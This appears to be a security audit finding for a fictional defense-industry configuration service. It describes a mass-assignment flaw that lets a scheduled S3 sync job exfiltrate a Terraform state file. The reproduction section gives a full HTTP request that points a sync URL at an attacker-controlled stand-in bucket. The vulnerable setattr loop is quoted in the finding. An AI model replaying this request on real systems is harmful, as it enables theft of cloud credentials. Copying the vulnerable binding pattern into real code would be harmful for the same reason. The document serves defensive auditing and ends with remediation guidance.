## System

- System: Aegis Vault & DIB Configuration Manager v8.0.4
- Domain: DEFENSE INDUSTRIAL BASE (DIB) / CUI & ITAR SCOPE
- Risk ID: RISK-DIB-011

## Findings

### 1. Mass Assignment — Sensitive Sync URL Overwrite via Unrestricted ORM Field Binding (Pattern 1.12)

The Flask `update_config` controller (`admin_routes.py`, section 6.1) applies all incoming JSON keys to the `DeploymentConfig` ORM object using `setattr()`:

```python
for key, value in data.items():
    if hasattr(config, key):
        setattr(config, key, value)  # THE FLAW: Arbitrary key assignment
```

The `deployment_config` table contains both benign fields (`deployment_region`, `sync_interval_minutes`) and security-critical fields (`internal_state_url`, `external_sync_url`). The endpoint is intended to accept only benign configuration changes (section 4.0, RISK-DIB-011), but there is no field allowlist — any column name present as an attribute on the model is writable. An attacker who includes `internal_state_url` and `external_sync_url` in the JSON body overwrites the scheduled synchronization paths with arbitrary values.

**HAR evidence**: POST `https://api.aegis-vault.dib/api/v1/admin/config/update` with JWT `role: DEVSECOPS_ADMIN`, `sub: usr_1192d`. Body includes `"internal_state_url": "s3://aegis-iac-state-internal/terraform.tfstate"` and `"external_sync_url": "s3://attacker-exfil-bucket-99/stolen-config-20260409.tfstate"`. Response: HTTP 200 OK, `{"updated_keys": ["deployment_region", "internal_state_url", "external_sync_url"]}` — confirming both sensitive sync URL fields were written to the database.

### 2. IaC State File Exfiltration via Scheduled Sync Job (Confused Deputy / SSRF, Pattern 4.4)

The `run_sync_job()` function executes unconditionally using the values stored in `deployment_config`:

```python
s3_client.sync_objects(
    source=config.internal_state_url,      # Now pointing to the secure state file
    destination=config.external_sync_url   # Now pointing to the attacker's public bucket
)
```

The `s3_client` runs under the privileged EC2 IAM role, which holds `s3:GetObject` and `s3:PutObject` for all internal GovCloud buckets. After the mass assignment persists the attacker's URLs, the next scheduled sync job (every 60 minutes) copies `s3://aegis-iac-state-internal/terraform.tfstate` — containing AWS access keys, PostgreSQL passwords, VPC CIDR blocks, and the raw KMS passphrase (section 3.2) — to the attacker-controlled `s3://attacker-exfil-bucket-99/`. The attacker's token never had S3 permissions directly; the confused deputy is the IAM-privileged EC2 instance executing the sync.

## Evidence

- **HAR trace**: `updated_keys` response confirms `internal_state_url` and `external_sync_url` were accepted and written. Attacker-controlled S3 URL in the request body is the exfiltration vector.
- **Python controller** (section 6.1): unrestricted `setattr(config, key, value)` loop — no field allowlist, no denylist for sensitive keys.
- **Schema** (section 5.0): `internal_state_url` and `external_sync_url` are regular `VARCHAR(255)` columns with no write-protection at the database layer.
- **Sync job** (section 6.1, `run_sync_job`): uses current `config.internal_state_url` and `config.external_sync_url` values from the database directly — no URL validation against an approved domain or bucket list.
- **IAM context** (section 2.2): EC2 IAM role holds `s3:GetObject` and `s3:PutObject` for ALL internal GovCloud buckets — the privileged identity executing the confused deputy.
- **Content at risk** (section 3.2): `terraform.tfstate` contains AWS access keys, PostgreSQL credentials, internal VPC IPs, and raw KMS passphrase — total DIB infrastructure compromise.

## Reproduction

**Step 1 — Mass assignment to overwrite sync targets:**

```http
POST /api/v1/admin/config/update HTTP/2.0
Host: api.aegis-vault.dib
Authorization: Bearer <JWT_role=DEVSECOPS_ADMIN, sub=usr_1192d>
Content-Type: application/json

{
  "deployment_region": "us-gov-west-1",
  "internal_state_url": "s3://aegis-iac-state-internal/terraform.tfstate",
  "external_sync_url": "s3://attacker-exfil-bucket-99/stolen-config-20260409.tfstate"
}
```

Expected secure outcome: HTTP 400 — `internal_state_url` and `external_sync_url` rejected as non-writable fields.  
Observed vulnerable outcome: HTTP 200 OK, `"updated_keys": ["deployment_region", "internal_state_url", "external_sync_url"]`.

**Step 2 — Wait for the scheduled sync job (≤60 minutes):**

The next `run_sync_job()` execution reads the poisoned values from the database and copies `terraform.tfstate` to `s3://attacker-exfil-bucket-99/`. The attacker retrieves the plaintext state file containing all secrets from the exfiltration bucket.

## Remediation

- **Use an explicit field allowlist in `update_config`** (RISK-DIB-011): replace the `setattr` loop with explicit assignment of only permitted benign fields: `config.deployment_region = data.get('deployment_region')`, `config.sync_interval_minutes = data.get('sync_interval_minutes')`. Never bind user input to `internal_state_url` or `external_sync_url` through any API endpoint.
- **Validate sync URLs against an approved bucket list before executing**: before `s3_client.sync_objects()`, verify `config.internal_state_url` matches the expected `s3://aegis-iac-state-internal/*` pattern and `config.external_sync_url` is in a hardcoded allowlist of approved internal backup buckets — reject any other values and emit a security alert.
- **Scope the EC2 IAM role to specific bucket ARNs**: restrict `s3:PutObject` to only `arn:aws-us-gov:s3:::aegis-iac-state-internal/*` and the specific approved backup bucket — prevent the IAM role from writing to any external or attacker-controlled bucket regardless of the URL stored in the database.
- **Move `internal_state_url` out of the writable database table**: store it as an environment variable or SSM Parameter Store secret on the EC2 instance — not in a row writable via the config API.
